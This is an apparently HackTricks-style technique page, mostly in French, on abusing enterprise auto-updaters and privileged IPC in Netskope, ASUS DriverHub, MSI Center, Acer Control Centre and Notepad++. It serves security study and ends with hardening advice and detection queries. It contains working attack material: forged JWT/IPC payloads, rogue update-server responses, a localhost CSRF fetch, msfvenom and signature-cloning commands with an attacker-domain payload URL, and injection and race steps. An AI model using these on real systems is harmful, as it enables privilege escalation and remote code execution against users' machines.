# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes d'escalade de privilèges locaux Windows trouvées dans des agents d'endpoint et updaters d'entreprise qui exposent une surface IPC à faible friction et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur non privilégié peut contraindre l'enrôlement vers un serveur contrôlé par l'attaquant puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés réutilisables contre des produits similaires :
- Abuser de l'IPC localhost d'un service privilégié pour forcer une réinscription ou une reconfiguration vers un serveur contrôlé par l'attaquant.
- Implémenter les endpoints de mise à jour du vendor, livrer une Trusted Root CA malveillante, et pointer l'updater vers un package malveillant « signé ».
- Éviter des vérifications de signature faibles (CN allow-lists), des flags de digest optionnels, et des propriétés MSI laxistes.
- Si l'IPC est « encrypted », dériver la key/IV à partir d'identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injecter dans un process allow-listé ou en lancer un en suspended et bootstrapper votre DLL via un minimal thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Beaucoup d'agents fournissent un process UI en user-mode qui communique avec un service SYSTEM via localhost TCP en utilisant JSON.

Observé dans Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flux d'exploitation:
1) Concevoir un JWT enrollment token dont les claims contrôlent l'hôte backend (p.ex., AddonUrl). Utiliser alg=None afin qu'aucune signature ne soit requise.
2) Envoyer le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre serveur malveillant pour l'enrôlement/configuration, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l'appelant est basée sur le chemin/nom, originez la requête depuis un binaire fournisseur sur liste blanche (voir §4).

---
## 2) Détournement du canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client parle à votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI d'attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Retourner une config JSON avec un intervalle de mise à jour très court, par exemple :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA au format PEM. Le service l'installe dans le magasin Trusted Root de la machine locale.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une version factice.

Contournement des vérifications courantes observées sur le terrain :
- Signer CN allow-list : le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre CA malveillante peut émettre un certificat leaf avec ce CN et signer le MSI.
- CERT_DIGEST property : inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune vérification appliquée lors de l'installation.
- Optional digest enforcement : un drapeau de configuration (p.ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

---
## 3) Fabrication de requêtes IPC chiffrées (lorsqu'elles sont présentes)

From R127, Netskope encapsule le JSON IPC dans un champ encryptData qui ressemble à du Base64. Reversing a montré AES avec clé/IV dérivés de valeurs de registre lisibles par n'importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard. Conseil général : si un agent commence soudainement à « chiffrer » son IPC, cherchez des device IDs, product GUIDs, install IDs sous HKLM comme material.

---
## 4) Contournement des allow-lists d'appelant IPC (vérifications de chemin/nom)

Certains services tentent d'authentifier le pair en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l'image avec des binaires fournisseur en allow-list situés sous Program Files (p.ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- DLL injection dans un processus en allow-list (p.ex., nsdiag.exe) et proxy IPC depuis l'intérieur de celui-ci.
- Lancer un binaire en allow-list en état suspendu et bootstrapper votre DLL proxy sans CreateRemoteThread (voir §5) pour satisfaire les règles anti-tamper appliquées par le driver.

---
## 5) Injection compatible avec la protection anti-tamper : processus suspendu + patch NtContinue

Les produits incluent souvent un driver minifilter/OB callbacks (p.ex., Stadrv) pour supprimer les droits dangereux des handles vers les processus protégés :
- Process : removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader en mode utilisateur fiable qui respecte ces contraintes :
1) CreateProcess d'un binaire fournisseur avec CREATE_SUSPENDED.
2) Obtenir les handles que vous êtes encore autorisé à avoir : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le process, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou juste THREAD_RESUME si vous patchz le code à un RIP connu).
3) Overwrite ntdll!NtContinue (ou autre thunk mappé tôt et garanti) avec un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis retourne.
4) ResumeThread pour déclencher votre stub en-process, chargeant votre DLL.

Parce que vous n'avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l'avez créé), la politique du driver est satisfaite.

---
## 6) Outils pratiques
- NachoVPN (Netskope plugin) automatise une CA malveillante, la signature de MSI malveillants, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC personnalisé qui forge des messages IPC arbitraires (optionnellement AES-encrypted) et inclut l'injection via processus suspendu pour provenir d'un binaire en allow-list.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Flux pratique :
1) Enregistrez un domaine qui intègre `.asus.com` et hébergez-y une page malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (p.ex., `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le body JSON attendu par le handler – le frontend JS packé montre le schéma ci-dessous.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même le PowerShell CLI montré ci-dessous réussit lorsque l'en-tête Origin est spoofed à la valeur de confiance :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Toute visite du navigateur vers le site de l'attaquant devient donc un CSRF local en 1 clic (ou 0-clic via `onload`) qui commande un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l'URL de téléchargement réutilise la même logique par sous-chaîne, ainsi `http://updates.asus.com.attacker.tld:8000/payload.exe` est accepté. Après le téléchargement, ADU.exe se contente de vérifier que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l'exécuter – pas de `WinVerifyTrust`, pas de validation de chaîne.

Pour weaponizer le flux :
1) Créer un payload (par ex., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Cloner le signataire d'ASUS dans celui-ci (par ex., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Héberger `pwn.exe` sur un domaine imitant `.asus.com` et déclencher UpdateApp via le CSRF navigateur ci‑dessus.

Parce que les filtres Origin et URL sont basés sur des sous-chaînes et que la vérification du signataire ne compare que des chaînes, DriverHub récupère et exécute le binaire de l'attaquant dans son contexte élevé.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque trame est `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) embarque `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l'exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le subject du certificat doit être “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l'attaquant.

Le fichier copié n'est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer le Frame A pointant vers un binaire légitime signé par MSI (garantit que la vérification de signature passe et que la tâche est mise en file).
- Le concurrencer en envoyant de manière répétée des Frame B pointant vers un payload malveillant, écrasant `MSI Center SDK.exe` juste après que la vérification soit terminée.

Quand le scheduler se déclenche, il exécute le payload écrasé en SYSTEM malgré la validation du fichier original. Une exploitation fiable utilise deux goroutines/threads qui spamment CMD_AutoUpdateSDK jusqu'à gagner la fenêtre TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d'une trame sélectionnent ce composant, permettant aux attaquants de router des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans **aucune validation de signature** – tout utilisateur local peut le pointer sur `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM de manière déterministe.
- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement la cartographie Component ↔ command ; des clients personnalisés en Go/Python peuvent alors rejouer les trames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et son ACL discrétionnaire autorise des clients distants (p.ex., `\\TARGET\pipe\treadstone_service_LightMode`). Envoyer l'ID de commande `7` avec un chemin de fichier invoque la routine de création de processus du service.
- La bibliothèque cliente sérialise un octet terminator magique (113) avec les arguments. L'instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d'instrumentation) montre que le handler natif mappe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d'intégrité avant d'appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) tombe dans la branche générique qui conserve le token SYSTEM complet et définit un SID d'intégrité élevé (`S-1-16-12288`). Le binaire lancé s'exécute donc en SYSTEM sans restrictions, localement et à travers les machines.
- Combinez cela avec le flag d'installateur exposé (`Setup.exe -nocheck`) pour déployer ACC même sur des VM de labo et tester le pipe sans matériel fournisseur.

Ces bugs IPC montrent pourquoi les services localhost doivent appliquer une authentification mutuelle (ALPC SIDs, filtres `ImpersonationLevel=Impersonation`, filtrage de token) et pourquoi chaque helper “run arbitrary binary” d'un module doit partager les mêmes vérifications du signataire.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Les anciens updaters Notepad++ basés sur WinGUp ne vérifiaient pas complètement l'authenticité des mises à jour. Quand des attaquants compromettaient le fournisseur d'hébergement du serveur de mise à jour, ils pouvaient altérer le manifest XML et rediriger uniquement certains clients vers des URL d'attaquants. Parce que le client acceptait n'importe quelle réponse HTTPS sans appliquer à la fois une chaîne de certificats de confiance et une signature PE valide, les victimes récupéraient et exécutaient un `update.exe` NSIS trojanisé.

Flux opérationnel (aucun exploit local requis) :
1. **Infrastructure interception** : compromettre le CDN/l'hébergement et répondre aux vérifications de mise à jour avec des métadonnées d'attaquant pointant vers une URL de téléchargement malveillante.
2. **Trojanized NSIS** : l'installateur récupère/exécute un payload et abuse de deux chaînes d'exécution :
- **Bring-your-own signed binary + sideload** : livrer le `BluetoothService.exe` signé par Bitdefender et déposer un `log.dll` malveillant dans son chemin de recherche. Quand le binaire signé s'exécute, Windows sideload `log.dll`, qui décrypte et charge réflexivement le backdoor Chrysalis (protégé par Warbird + hashing d'API pour compliquer la détection statique).
- **Scripted shellcode injection** : NSIS exécute un script Lua compilé qui utilise des APIs Win32 (p.ex., `EnumWindowStationsW`) pour injecter du shellcode et embarquer un Cobalt Strike Beacon.

Mesures de durcissement/détection pour tout auto-updater :
- Appliquer **certificate + signature verification** de l'installateur téléchargé (pinner le signataire du fournisseur, rejeter les CN/chaînes non correspondants) et signer le manifest de mise à jour lui‑même (p.ex., XMLDSig). Bloquer les redirections contrôlées par le manifest à moins qu'elles ne soient validées.
- Traiter **BYO signed binary sideloading** comme un pivot de détection post-téléchargement : alerter lorsqu'un EXE signé d'un éditeur charge un nom de DLL en dehors de son chemin d'installation canonique (p.ex., Bitdefender chargeant `log.dll` depuis Temp/Downloads) et lorsqu'un updater dépose/exécute des installateurs depuis temp avec des signatures non‑fournisseur.
- Surveiller les **malware-specific artifacts** observés dans cette chaîne (utiles comme pivots génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` dans `%TEMP%`, et étapes d'injection de shellcode pilotées par Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lancement d'un installateur non-Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ces schémas se généralisent à tout outil de mise à jour qui accepte des manifests non signés ou qui ne vérifie pas les signataires des installateurs — détournement du réseau + installateur malveillant + BYO-signed sideloading entraînent une remote code execution sous couvert de mises à jour « de confiance ».

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
